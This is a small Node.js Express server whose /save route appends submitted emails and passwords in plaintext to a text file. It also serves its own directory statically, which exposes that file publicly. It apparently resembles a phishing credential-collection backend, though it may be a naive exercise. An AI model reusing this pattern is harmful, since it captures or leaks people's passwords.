const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.static(__dirname));
app.use(express.json());

app.post('/save', (req, res) => {
  const { email, password } = req.body;

  const entry = `Email: ${email}\nPassword: ${password}\n---\n`;

  fs.appendFile('user_data.txt', entry, (err) => {
    if (err) {
      console.error('Error saving data:', err);
      res.status(500).json({ message: 'Error saving data' });
    } else {
      console.log('Data saved!');
      res.json({ message: 'Data saved' });
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
